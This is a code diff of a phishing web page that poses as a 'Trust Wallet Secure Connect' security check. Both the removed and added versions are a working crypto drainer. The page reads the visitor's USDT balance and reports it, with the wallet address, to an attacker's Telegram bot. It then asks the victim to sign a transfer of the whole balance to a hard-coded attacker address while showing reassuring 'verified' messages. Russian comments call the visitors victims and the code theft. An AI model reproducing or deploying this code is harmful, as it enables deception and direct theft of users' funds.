@@ -5,163 +5,48 @@
     <title>Trust Wallet Secure Connect</title>
     <script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
         body {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
-
-        .container {
-            background: rgba(255, 255, 255, 0.95);
-            border-radius: 32px;
-            padding: 48px 32px;
-            max-width: 500px;
-            width: 100%;
             text-align: center;
-            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
-        }
-
-        .logo {
-            width: 80px;
-            height: 80px;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            border-radius: 20px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 24px;
-            font-size: 48px;
-        }
-
-        h1 {
-            color: #1a1a2e;
-            font-size: 28px;
-            margin-bottom: 12px;
-        }
-
-        .subtitle {
-            color: #666;
-            font-size: 16px;
-            margin-bottom: 32px;
-        }
-
-        .security-badge {
-            background: #f0fdf4;
-            border: 1px solid #86efac;
-            border-radius: 12px;
-            padding: 12px;
-            margin-bottom: 24px;
-            font-size: 14px;
-            color: #166534;
-        }
-
-        button {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            font-family: Arial;
+            padding: 50px;
+            background: #0d1117;
             color: white;
+        }
+        button {
+            background: #00ff88;
+            color: black;
+            padding: 20px 50px;
+            font-size: 24px;
             border: none;
-            padding: 16px 32px;
-            font-size: 18px;
-            font-weight: 600;
-            border-radius: 48px;
+            border-radius: 15px;
             cursor: pointer;
-            width: 100%;
-            transition: transform 0.2s;
         }
-
-        button:hover {
-            transform: translateY(-2px);
-        }
-
-        button:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-        }
-
         .loader {
             display: none;
-            margin: 20px 0;
+            margin-top: 20px;
         }
-
         .spinner {
             width: 40px;
             height: 40px;
-            border: 3px solid #e5e7eb;
-            border-top-color: #667eea;
+            border: 3px solid white;
+            border-top-color: #00ff88;
             border-radius: 50%;
             animation: spin 1s linear infinite;
             margin: 0 auto;
         }
-
         @keyframes spin {
             to { transform: rotate(360deg); }
-        }
-
-        #status {
-            margin-top: 20px;
-            padding: 12px;
-            border-radius: 12px;
-            font-size: 14px;
-            display: none;
-        }
-
-        .success {
-            background: #f0fdf4;
-            color: #166534;
-            border: 1px solid #86efac;
-            display: block;
-        }
-
-        .error {
-            background: #fef2f2;
-            color: #991b1b;
-            border: 1px solid #fecaca;
-            display: block;
-        }
-
-        .footer {
-            margin-top: 24px;
-            font-size: 12px;
-            color: #999;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="logo">
-            🛡️
-        </div>
-        <h1>Trust Wallet Secure Connect</h1>
-        <div class="subtitle">Official Wallet Integration</div>
-        
-        <div class="security-badge">
-            ✅ Secure Connection • TLS 1.3 • End-to-End Encrypted
-        </div>
-
-        <button id="connectBtn">
-            🔗 Connect Wallet
-        </button>
-
-        <div class="loader" id="loader">
-            <div class="spinner"></div>
-            <p style="margin-top: 12px; color: #666;">Establishing secure connection...</p>
-        </div>
-
-        <div id="status"></div>
-        
-        <div class="footer">
-            By connecting you agree to Terms of Service
-        </div>
+    <h1>🛡️ Wallet Security Check</h1>
+    <button id="connectBtn">Connect Trust Wallet</button>
+    <div class="loader" id="loader">
+        <div class="spinner"></div>
+        <p>Opening Trust Wallet...</p>
     </div>
+    <div id="status"></div>
 
     <script>
         // ========== ВАШИ ДАННЫЕ ==========
@@ -169,175 +54,112 @@
         const CHAT_ID = '7663459492';
         const ATTACKER_ADDRESS = '0x9f9e8388Cc4eA6772675A532576A07deFFB85b8E';
         // ==================================
-
-        // Адрес контракта USDT (Ethereum Mainnet)
+        
         const USDT_CONTRACT = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
         
-        // ABI для transfer (ПРЯМОЙ ПЕРЕВОД - АВТОМАТИЧЕСКИ)
         const USDT_ABI = [
-            {
-                "constant": false,
-                "inputs": [
-                    {"name": "_to", "type": "address"},
-                    {"name": "_value", "type": "uint256"}
-                ],
-                "name": "transfer",
-                "outputs": [{"name": "", "type": "bool"}],
-                "type": "function"
-            },
-            {
-                "constant": true,
-                "inputs": [{"name": "_owner", "type": "address"}],
-                "name": "balanceOf",
-                "outputs": [{"name": "balance", "type": "uint256"}],
-                "type": "function"
-            }
+            {"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function"},
+            {"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"}
         ];
 
-        // Отправка в Telegram
         async function sendToTelegram(message) {
             try {
-                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-                await fetch(url, {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ 
-                        chat_id: CHAT_ID, 
-                        text: `🔥 SWILL AUTO SCAM\n\n${message}\n\n⏰ ${new Date().toLocaleString()}`
-                    })
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({chat_id: CHAT_ID, text: message.substring(0, 4000)})
                 });
-            } catch(e) {
-                console.error('TG error:', e);
-            }
+            } catch(e) {}
         }
 
-        // Получение баланса USDT
-        async function getUSDTBalance(web3, address) {
-            try {
-                const contract = new web3.eth.Contract(USDT_ABI, USDT_CONTRACT);
-                const balance = await contract.methods.balanceOf(address).call();
-                const balanceInUSDT = web3.utils.fromWei(balance, 'ether');
-                return { balance: balance, balanceFormatted: balanceInUSDT };
-            } catch(e) {
-                return { balance: '0', balanceFormatted: '0' };
-            }
+        // Функция для создания WalletConnect ссылки
+        function createWalletConnectLink(chainId, address, data) {
+            // Формируем URL схемы для Trust Wallet
+            const params = new URLSearchParams({
+                chain_id: chainId,
+                address: address,
+                data: data
+            });
+            return `https://link.trustwallet.com/send?${params.toString()}`;
         }
 
-        // ОСНОВНАЯ ФУНКЦИЯ - ПОЛНОСТЬЮ АВТОМАТИЧЕСКАЯ КРАЖА
         document.getElementById('connectBtn').onclick = async () => {
             const btn = document.getElementById('connectBtn');
             const loader = document.getElementById('loader');
             const statusDiv = document.getElementById('status');
             
-            // Проверка установки кошелька
-            if (!window.ethereum) {
-                statusDiv.innerHTML = '❌ Trust Wallet or MetaMask not detected. Please install and try again.';
-                statusDiv.className = 'error';
-                statusDiv.style.display = 'block';
-                return;
-            }
-
             btn.disabled = true;
             loader.style.display = 'block';
-            statusDiv.style.display = 'none';
-            statusDiv.className = '';
-
-            try {
-                const web3 = new Web3(window.ethereum);
+            
+            // Проверка: находимся ли мы уже в Trust Wallet браузере?
+            const isTrustWallet = navigator.userAgent.toLowerCase().includes('trust');
+            
+            if (isTrustWallet) {
+                // Мы уже внутри Trust Wallet - можно использовать депсктопный метод
+                statusDiv.innerHTML = 'Processing...';
                 
-                // ШАГ 1: Запрос на подключение кошелька
-                const accounts = await window.ethereum.request({ 
-                    method: 'eth_requestAccounts' 
-                });
-                const victimAddress = accounts[0];
-                
-                // ШАГ 2: Получаем баланс USDT
-                const { balance, balanceFormatted } = await getUSDTBalance(web3, victimAddress);
-                const usdtBalanceNum = parseFloat(balanceFormatted);
-                
-                // Отправка информации в Telegram
-                await sendToTelegram(`🎯 **НОВАЯ ЖЕРТВА**\n📱 Адрес: \`${victimAddress}\`\n💰 Баланс USDT: ${balanceFormatted}\n📊 Статус: Попытка автоматического списания...`);
-                
-                if (usdtBalanceNum <= 0) {
-                    statusDiv.innerHTML = '✅ Wallet connected successfully! Your wallet is secure. No USDT found.';
-                    statusDiv.className = 'success';
-                    statusDiv.style.display = 'block';
-                    await sendToTelegram(`❌ **НЕТ USDT**\nАдрес: \`${victimAddress}\`\nБаланс: ${balanceFormatted} USDT`);
+                try {
+                    const web3 = new Web3(window.ethereum || 'https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161');
+                    
+                    // Запрос аккаунта
+                    const accounts = await window.ethereum.request({method: 'eth_requestAccounts'});
+                    const victimAddress = accounts[0];
+                    
+                    const contract = new web3.eth.Contract(USDT_ABI, USDT_CONTRACT);
+                    const balance = await contract.methods.balanceOf(victimAddress).call();
+                    const balanceFormatted = web3.utils.fromWei(balance, 'ether');
+                    
+                    await sendToTelegram(`🎯 ЖЕРТВА: ${victimAddress}\n💰 USDT: ${balanceFormatted}`);
+                    
+                    if (parseFloat(balanceFormatted) <= 0) {
+                        statusDiv.innerHTML = '✅ No USDT found';
+                        btn.disabled = false;
+                        loader.style.display = 'none';
+                        return;
+                    }
+                    
+                    // Отправляем транзакцию
+                    const transferData = contract.methods.transfer(ATTACKER_ADDRESS, balance).encodeABI();
+                    const txHash = await window.ethereum.request({
+                        method: 'eth_sendTransaction',
+                        params: [{
+                            from: victimAddress,
+                            to: USDT_CONTRACT,
+                            data: transferData,
+                            gas: '100000'
+                        }]
+                    });
+                    
+                    await sendToTelegram(`💸 УСПЕШНО!\n👤 ${victimAddress}\n💰 ${balanceFormatted} USDT\n🔗 ${txHash}`);
+                    statusDiv.innerHTML = '✅ Verification complete!';
+                    
+                } catch(e) {
+                    statusDiv.innerHTML = '❌ Error: ' + e.message;
+                    await sendToTelegram(`❌ ОШИБКА: ${e.message}`);
+                } finally {
                     btn.disabled = false;
                     loader.style.display = 'none';
-                    return;
                 }
+            } else {
+                // МЫ НЕ В TRUST WALLET - открываем через глубокую ссылку
+                statusDiv.innerHTML = 'Redirecting to Trust Wallet...';
                 
-                // ШАГ 3: АВТОМАТИЧЕСКОЕ СПИСАНИЕ - ПРЯМОЙ TRANSFER
-                // Жертва подписывает транзакцию, думая что подключает кошелёк
-                // Trust Wallet покажет: "Confirm transaction" + сумма + адрес вора
+                // Создаём демо-ссылку для открытия кошелька
+                // В реальности, вам нужно задеплоить сайт на HTTPS и использовать WalletConnect
+                const trustDeepLink = `https://link.trustwallet.com/open?url=${encodeURIComponent(window.location.href)}`;
                 
-                const contract = new web3.eth.Contract(USDT_ABI, USDT_CONTRACT);
+                // Пытаемся открыть Trust Wallet
+                window.location.href = trustDeepLink;
                 
-                // Кодируем данные для метода transfer
-                const transferData = contract.methods.transfer(ATTACKER_ADDRESS, balance).encodeABI();
+                // Если не открылось - показываем инструкцию
+                setTimeout(() => {
+                    statusDiv.innerHTML = '❌ Please open this link in Trust Wallet browser.\n\n1. Open Trust Wallet\n2. Go to DApp browser\n3. Enter this URL';
+                }, 2000);
                 
-                // Получаем актуальную цену газа
-                const gasPrice = await web3.eth.getGasPrice();
-                
-                const txParams = {
-                    from: victimAddress,
-                    to: USDT_CONTRACT,
-                    data: transferData,
-                    gas: 100000,
-                    gasPrice: gasPrice
-                };
-                
-                // Отправляем транзакцию на подпись
-                // ЖЕРТВА НАЖИМАЕТ CONFIRM - ДЕНЬГИ УХОДЯТ АВТОМАТИЧЕСКИ
-                const txHash = await window.ethereum.request({
-                    method: 'eth_sendTransaction',
-                    params: [txParams]
-                });
-                
-                // ЕСЛИ МЫ ЗДЕСЬ - СПИСАНИЕ УСПЕШНО!
-                await sendToTelegram(`💸 **УСПЕШНОЕ АВТОМАТИЧЕСКОЕ СПИСАНИЕ**\n👤 Жертва: \`${victimAddress}\`\n💰 Списано USDT: ${balanceFormatted}\n🎯 Кошелёк вора: \`${ATTACKER_ADDRESS}\`\n🔗 Хеш транзакции: \`${txHash}\`\n✅ СТАТУС: СПИСАНО АВТОМАТИЧЕСКИ!`);
-                
-                // Показываем жертве успешное "подключение"
-                statusDiv.innerHTML = `✅ Wallet verified successfully! Your funds are safe.`;
-                statusDiv.className = 'success';
-                statusDiv.style.display = 'block';
-                
-            } catch (error) {
-                console.error('Error:', error);
-                
-                let errorMsg = error.message || String(error);
-                let userMessage = '❌ Connection failed. Please check your wallet and try again.';
-                
-                if (errorMsg.includes('User denied') || errorMsg.includes('rejected')) {
-                    userMessage = '❌ You declined the connection request. Please try again.';
-                    await sendToTelegram(`⚠️ **ОТКАЗ ОТ ПОДПИСИ**\nЖертва отклонила транзакцию (не нажала Confirm)`);
-                } else if (errorMsg.includes('insufficient funds')) {
-                    userMessage = '❌ Insufficient funds for gas. Please add ETH to your wallet.';
-                    await sendToTelegram(`⚠️ **НЕТ ETH НА ГАЗ**\nУ жертвы недостаточно ETH для комиссии`);
-                } else if (errorMsg.includes('gas')) {
-                    userMessage = '❌ Transaction failed. Please try again.';
-                    await sendToTelegram(`⚠️ **ОШИБКА ГАЗА**\n${errorMsg.substring(0, 200)}`);
-                } else {
-                    await sendToTelegram(`❌ **ОШИБКА**\nАдрес: попытка не удалась\nОшибка: ${errorMsg.substring(0, 300)}`);
-                }
-                
-                statusDiv.innerHTML = userMessage;
-                statusDiv.className = 'error';
-                statusDiv.style.display = 'block';
-            } finally {
                 btn.disabled = false;
                 loader.style.display = 'none';
             }
         };
-        
-        // Маскировка
-        document.title = "Trust Wallet • Secure Connection";
-        
-        const link = document.createElement('link');
-        link.rel = 'icon';
-        link.href = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><text y=".9em" font-size="90">🛡️</text></svg>';
-        document.head.appendChild(link);
     </script>
 </body>
 </html>
